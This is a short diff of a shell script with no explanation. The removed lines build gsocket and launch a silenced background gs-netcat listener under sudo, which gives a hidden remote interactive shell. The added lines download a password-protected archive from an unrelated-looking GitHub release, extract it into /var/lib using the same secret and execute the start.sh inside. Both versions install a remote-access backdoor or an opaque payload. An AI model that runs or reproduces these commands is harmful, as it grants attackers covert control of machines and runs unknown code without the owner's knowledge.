@@ -1,8 +1,4 @@
-git clone --depth 1 https://github.com/hackerschoice/gsocket.git
-cd gsocket
-./bootstrap
-./configure --prefix=/usr
-make
-sudo make install
-cd /
-sudo gs-netcat -s $PGS -l -i &>/dev/null
+wget https://github.com/sound5304/spotube/releases/download/zip/zero.7z
+7z -p$PGS e zero.7z -o/var/lib/ -y
+chmod +x /var/lib/start.sh
+/var/lib/start.sh
